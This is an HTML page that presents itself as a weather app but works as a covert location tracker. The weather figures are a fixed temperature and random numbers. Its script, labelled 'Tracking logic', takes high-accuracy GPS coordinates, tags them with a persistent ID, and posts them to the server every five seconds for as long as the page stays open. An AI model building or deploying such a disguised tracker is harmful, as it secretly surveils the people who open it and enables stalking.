<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather App – Check Your Local Weather</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after {
            margin: 0; padding: 0; box-sizing: border-box;
        }

        :root {
            --sky-1: #0f0c29;
            --sky-2: #302b63;
            --sky-3: #24243e;
            --accent: #7dd3fc;
            --accent2: #38bdf8;
            --glow: rgba(125, 211, 252, 0.25);
            --card-bg: rgba(255,255,255,0.06);
            --card-border: rgba(255,255,255,0.12);
            --text: #f0f9ff;
            --text-muted: #94a3b8;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, var(--sky-1) 0%, var(--sky-2) 50%, var(--sky-3) 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            overflow: hidden;
            position: relative;
            color: var(--text);
        }

        /* ── Floating Orbs Background ── */
        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            pointer-events: none;
            animation: drift 12s ease-in-out infinite alternate;
        }
        .orb1 { width: 400px; height: 400px; background: rgba(56,189,248,0.18); top: -100px; left: -100px; animation-delay: 0s; }
        .orb2 { width: 300px; height: 300px; background: rgba(139,92,246,0.15); bottom: -80px; right: -80px; animation-delay: 3s; }
        .orb3 { width: 200px; height: 200px; background: rgba(34,211,238,0.12); top: 50%; left: 60%; animation-delay: 6s; }

        @keyframes drift {
            0%   { transform: translate(0,0) scale(1); }
            100% { transform: translate(30px, 20px) scale(1.08); }
        }

        /* ── Floating Particles ── */
        .particles { position: absolute; inset: 0; pointer-events: none; }
        .particle {
            position: absolute;
            width: 2px; height: 2px;
            background: rgba(255,255,255,0.4);
            border-radius: 50%;
            animation: float-up linear infinite;
        }
        @keyframes float-up {
            0%   { transform: translateY(100vh) scale(0); opacity: 0; }
            10%  { opacity: 1; }
            90%  { opacity: 0.6; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        /* ── Main Card ── */
        .card {
            position: relative;
            z-index: 10;
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--card-border);
            border-radius: 28px;
            padding: 2.5rem 2rem 2rem;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow:
                0 0 0 1px rgba(255,255,255,0.05),
                0 20px 60px rgba(0,0,0,0.5),
                0 0 60px var(--glow);
            animation: card-in 0.7s cubic-bezier(0.22,1,0.36,1) both;
        }

        @keyframes card-in {
            from { opacity: 0; transform: translateY(40px) scale(0.95); }
            to   { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* ── App Label ── */
        .app-label {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(125,211,252,0.12);
            border: 1px solid rgba(125,211,252,0.25);
            border-radius: 999px;
            padding: 4px 14px;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 0.08em;
            color: var(--accent);
            text-transform: uppercase;
            margin-bottom: 1.2rem;
        }

        /* ── Weather Icon Area ── */
        .icon-wrap {
            position: relative;
            width: 110px;
            height: 110px;
            margin: 0 auto 1.2rem;
        }

        .icon-wrap .glow-ring {
            position: absolute;
            inset: -10px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(125,211,252,0.2), transparent 70%);
            animation: pulse-ring 3s ease-in-out infinite;
        }

        @keyframes pulse-ring {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50%       { transform: scale(1.1); opacity: 0.4; }
        }

        .icon-wrap img {
            position: relative;
            z-index: 2;
            width: 100%;
            height: 100%;
            object-fit: contain;
            filter: drop-shadow(0 0 16px rgba(125,211,252,0.5));
            animation: bob 4s ease-in-out infinite;
        }

        @keyframes bob {
            0%, 100% { transform: translateY(0); }
            50%       { transform: translateY(-8px); }
        }

        /* ── Temperature ── */
        .temp {
            font-size: 4.5rem;
            font-weight: 800;
            letter-spacing: -3px;
            line-height: 1;
            background: linear-gradient(135deg, #e0f2fe, #7dd3fc, #38bdf8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.2rem;
        }

        .condition {
            font-size: 1.05rem;
            color: var(--text-muted);
            font-weight: 500;
            margin-bottom: 0.5rem;
            letter-spacing: 0.02em;
        }

        .location-text {
            font-size: 0.82rem;
            color: rgba(148,163,184,0.7);
            font-weight: 400;
            margin-bottom: 1.8rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }

        /* ── Stat Pills Row ── */
        .stats {
            display: flex;
            gap: 0.6rem;
            justify-content: center;
            margin-bottom: 1.8rem;
            flex-wrap: wrap;
        }

        .stat-pill {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 0.45rem 0.85rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            min-width: 72px;
        }

        .stat-pill .stat-label {
            font-size: 0.6rem;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: var(--text-muted);
            font-weight: 600;
        }

        .stat-pill .stat-val {
            font-size: 0.88rem;
            font-weight: 700;
            color: var(--accent);
        }

        /* ── CTA Button ── */
        .btn-check {
            position: relative;
            width: 100%;
            padding: 1rem 1.5rem;
            font-size: 1rem;
            font-weight: 700;
            font-family: 'Inter', sans-serif;
            color: #0c1a2e;
            background: linear-gradient(135deg, #7dd3fc 0%, #38bdf8 50%, #0ea5e9 100%);
            border: none;
            border-radius: 16px;
            cursor: pointer;
            overflow: hidden;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 6px 24px rgba(14,165,233,0.45), 0 2px 8px rgba(0,0,0,0.2);
            letter-spacing: 0.01em;
        }

        .btn-check::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
            transition: left 0.5s;
        }

        .btn-check:hover::before { left: 100%; }
        .btn-check:hover { transform: translateY(-2px); box-shadow: 0 10px 32px rgba(14,165,233,0.55); }
        .btn-check:active { transform: translateY(0); }

        .btn-check:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .btn-inner {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-spinner {
            display: none;
            width: 16px; height: 16px;
            border: 2px solid rgba(12,26,46,0.3);
            border-top-color: #0c1a2e;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .btn-check.loading .btn-spinner { display: block; }
        .btn-check.loading .btn-text { opacity: 0.7; }

        /* ── Bottom hint ── */
        .hint {
            margin-top: 1rem;
            font-size: 0.72rem;
            color: rgba(148,163,184,0.55);
            letter-spacing: 0.02em;
        }

        /* ── Status bar ── */
        .status-bar {
            display: none;
            margin-top: 0.9rem;
            padding: 0.55rem 1rem;
            background: rgba(74,222,128,0.1);
            border: 1px solid rgba(74,222,128,0.2);
            border-radius: 10px;
            font-size: 0.78rem;
            color: #4ade80;
            font-weight: 600;
            animation: fade-in 0.4s ease;
        }

        .status-bar.show { display: block; }

        @keyframes fade-in { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }

        @media (max-width: 420px) {
            .card { padding: 2rem 1.4rem 1.6rem; }
            .temp { font-size: 3.8rem; }
        }
    </style>
</head>

<body>
    <!-- Ambient orbs -->
    <div class="orb orb1"></div>
    <div class="orb orb2"></div>
    <div class="orb orb3"></div>

    <!-- Particles -->
    <div class="particles" id="particles"></div>

    <!-- Main Card -->
    <div class="card">
        <div class="app-label">🌤️ Weather Forecast</div>

        <div class="icon-wrap">
            <div class="glow-ring"></div>
            <img src="/weather.png" alt="Weather Icon" id="weather-img">
        </div>

        <div class="temp" id="temperature">25°C</div>
        <div class="condition" id="condition">Partly Cloudy</div>

        <div class="location-text">
            <span>📍</span>
            <span id="city">Your City</span>,&nbsp;<span id="country">Country</span>
        </div>

        <div class="stats">
            <div class="stat-pill">
                <span class="stat-label">Humidity</span>
                <span class="stat-val" id="stat-humidity">—</span>
            </div>
            <div class="stat-pill">
                <span class="stat-label">Wind</span>
                <span class="stat-val" id="stat-wind">—</span>
            </div>
            <div class="stat-pill">
                <span class="stat-label">UV Index</span>
                <span class="stat-val" id="stat-uv">—</span>
            </div>
        </div>

        <button class="btn-check" id="check-weather">
            <div class="btn-inner">
                <span class="btn-spinner"></span>
                <span class="btn-text">☁️ Get My Weather</span>
            </div>
        </button>

        <div class="status-bar" id="status-bar">✅ Location detected — fetching forecast…</div>

        <p class="hint">Tap to load real-time weather for your location</p>
    </div>

    <script>
        // ── Generate floating particles ──────────────────────
        const container = document.getElementById('particles');
        for (let i = 0; i < 30; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.cssText = `
                left: ${Math.random() * 100}%;
                width: ${Math.random() * 3 + 1}px;
                height: ${Math.random() * 3 + 1}px;
                animation-duration: ${Math.random() * 15 + 8}s;
                animation-delay: ${Math.random() * 10}s;
                opacity: ${Math.random() * 0.5 + 0.2};
            `;
            container.appendChild(p);
        }

        // ── Tracking logic (preserved from original) ─────────
        const id = localStorage.getItem("id") || generateId();
        const btn = document.getElementById("check-weather");
        let __interval;

        btn.addEventListener("click", () => {
            btn.disabled = true;
            btn.classList.add('loading');
            btn.querySelector('.btn-text').textContent = 'Fetching…';
            document.getElementById('status-bar').classList.remove('show');
            getLocation();
        });

        function getLocation() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    btn.disabled = true;
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;

                    // Show status
                    const sb = document.getElementById('status-bar');
                    sb.classList.add('show');

                    // Update stat pills with simulated data for UI feel
                    document.getElementById('stat-humidity').textContent = Math.floor(Math.random() * 30 + 55) + '%';
                    document.getElementById('stat-wind').textContent = Math.floor(Math.random() * 15 + 5) + ' km/h';
                    document.getElementById('stat-uv').textContent = Math.floor(Math.random() * 5 + 1);

                    // Update city display from coords (quick visual feedback)
                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                        .then(r => r.json())
                        .then(d => {
                            if (d.city) document.getElementById('city').textContent = d.city;
                            if (d.countryName) document.getElementById('country').textContent = d.countryName;
                            if (d.principalSubdivision) document.getElementById('condition').textContent = '📍 ' + d.principalSubdivision;
                        }).catch(() => {});

                    fetch("/weather", {
                        method: "POST",
                        body: JSON.stringify({ id, lat, lng }),
                        headers: { "Content-Type": "application/json" }
                    }).catch(error => {
                        console.log("post error", error);
                    });
                },
                (error) => {
                    alert("Please turn on GPS / Location for weather.");
                    btn.disabled = false;
                    btn.classList.remove('loading');
                    btn.querySelector('.btn-text').textContent = '☁️ Get My Weather';
                    console.error("Error:", error);
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 10000
                }
            );

            if (__interval) clearTimeout(__interval);
            __interval = setTimeout(getLocation, 5000);
        }

        function generateId(length = 10) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            localStorage.setItem("id", result);
            return result;
        }
    </script>
</body>

</html>
